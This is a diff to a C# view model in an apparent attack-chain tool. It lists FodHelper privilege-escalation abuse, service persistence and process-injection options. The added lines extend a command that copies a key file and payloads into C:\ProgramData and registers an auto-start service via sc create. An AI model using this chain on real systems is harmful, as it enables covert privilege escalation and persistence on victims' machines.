@@ -64,7 +64,7 @@ public partial class BehaviorChainViewModel : ViewModelBase
 
     public IReadOnlyList<string> PrivEscBehaviors { get; } = ["FodHelperAbuse"];
     public IReadOnlyList<string> PersistenceBehaviors { get; } = ["ServiceInstall"];
-    public IReadOnlyList<string> InjectionBehaviors { get; } = ["Simple", "Apc-MultiThreaded", "Apc-EarlyBird"];
+    public IReadOnlyList<string> InjectionBehaviors { get; } = ["Simple"];
 
     private ObservableCollection<string> _payloads = [];
     public ObservableCollection<string> Payloads
@@ -92,7 +92,10 @@ public partial class BehaviorChainViewModel : ViewModelBase
 
     private string BuildFodHelperCommand(string resolvedBinaryPath) =>
         $@"cmd.exe /c " +
+        $@"mkdir C:\ProgramData\Mabean 2>nul & " + 
         $@"copy /Y ""{resolvedBinaryPath}"" ""{destExe}"" && " +
+        $@"copy /Y ""{Paths.KeyBinPath}"" ""C:\ProgramData\Mabean\key.bin"" && "  + 
+        $@"robocopy ""{Paths.PayloadsDir}"" ""C:\ProgramData\Mabean\Payloads"" /E & " +
         $@"robocopy ""{Paths.SessionConfigDir}"" ""C:\ProgramData\Mabean\SessionConfig"" /E & " +
         $@"robocopy ""{Paths.Dlls}"" ""C:\ProgramData\Mabean\Dlls"" /E & " +
         $@"sc create {PersistenceServiceName} binPath= ""{destExe}"" start= auto && " +
@@ -101,6 +104,7 @@ public partial class BehaviorChainViewModel : ViewModelBase
     private async Task RunChain()
     {
         var resolvedBinaryPath = PersistenceUseDefaultPath ? DefaultServiceBinaryPath : PersistenceBinaryPath;
+        Console.WriteLine($"Resolved binary path for persistence: {resolvedBinaryPath}");
         var fodHelperCommand = BuildFodHelperCommand(resolvedBinaryPath);
 
         var definition = new BehaviorChainDefinition
